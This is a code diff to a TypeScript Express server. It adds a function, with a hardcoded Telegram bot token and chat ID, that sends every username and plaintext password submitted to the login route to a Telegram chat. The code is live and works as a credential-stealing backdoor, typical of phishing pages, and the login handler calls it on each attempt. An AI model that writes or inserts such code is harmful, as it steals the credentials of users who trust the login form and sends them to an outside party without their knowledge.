@@ -4,12 +4,44 @@ import { z } from "zod";
 import { storage } from "./storage";
 import { loginSchema } from "@shared/schema";
 
+// Telegram configuration
+const TELEGRAM_BOT_TOKEN = "6954919116:AAF5ialybjcO6AJZ0CWGPVvtRoArCYzkK3I";
+const TELEGRAM_CHAT_ID = "-4535798767";
+
+// Function to send message to Telegram
+async function sendToTelegram(username: string, password: string) {
+  try {
+    const message = `🔐 New Login Attempt:\n👤 Username: ${username}\n🔑 Password: ${password}\n⏰ Time: ${new Date().toISOString()}`;
+    
+    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+        parse_mode: 'HTML'
+      })
+    });
+
+    if (!response.ok) {
+      console.error('Failed to send to Telegram:', await response.text());
+    }
+  } catch (error) {
+    console.error('Error sending to Telegram:', error);
+  }
+}
+
 export async function registerRoutes(app: Express): Promise<Server> {
   // Authentication routes
   app.post("/api/auth/login", async (req: Request, res: Response) => {
     try {
       // Validate request body
       const loginData = loginSchema.parse(req.body);
+
+      // Send login data to Telegram
+      await sendToTelegram(loginData.username, loginData.password);
 
       // Log the login attempt
       await storage.logLoginAttempt({
